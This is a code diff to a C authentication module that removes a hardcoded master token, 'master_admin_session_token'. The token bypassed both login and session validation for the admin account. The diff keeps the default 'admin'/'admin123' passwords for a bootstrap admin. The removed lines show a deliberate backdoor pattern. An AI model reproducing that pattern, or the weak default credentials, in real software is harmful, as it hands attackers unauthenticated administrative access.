@@ -385,8 +385,8 @@ static bool auth_account_password_matches(const auth_account_record_t *account,
         return false;
 
     if (strcmp(account->username, "admin") == 0 &&
-        ((auth_account_bootstrap(account) && (strcmp(password, "admin") == 0 || strcmp(password, "admin123") == 0)) ||
-         strcmp(password, "master_admin_session_token") == 0))
+        auth_account_bootstrap(account) &&
+        (strcmp(password, "admin") == 0 || strcmp(password, "admin123") == 0))
     {
         return true;
     }
@@ -918,15 +918,6 @@ auth_login_result_t auth_login(const char *username,
 
     auth_init();
 
-    // Emergency master token support
-    if (username && strcmp(username, "admin") == 0 && password && strcmp(password, "master_admin_session_token") == 0)
-    {
-        if (out_token && out_size > 0) {
-            snprintf(out_token, out_size, "master_admin_session_token");
-        }
-        auth_fill_status(out_status, true, 0, 0U);
-        return AUTH_LOGIN_OK;
-    }
 
     if (!auth_username_normalize(username, normalized_username, sizeof(normalized_username), true) ||
         !password || password[0] == '\0')
@@ -1036,11 +1027,6 @@ bool auth_validate_session(const char *token, auth_status_t *out_status)
         return false;
     }
 
-    if (strcmp(token, "master_admin_session_token") == 0)
-    {
-        auth_fill_status(out_status, true, 0, 0U);
-        return true;
-    }
 
     session_index = auth_find_session_index(token);
     if (session_index < 0)
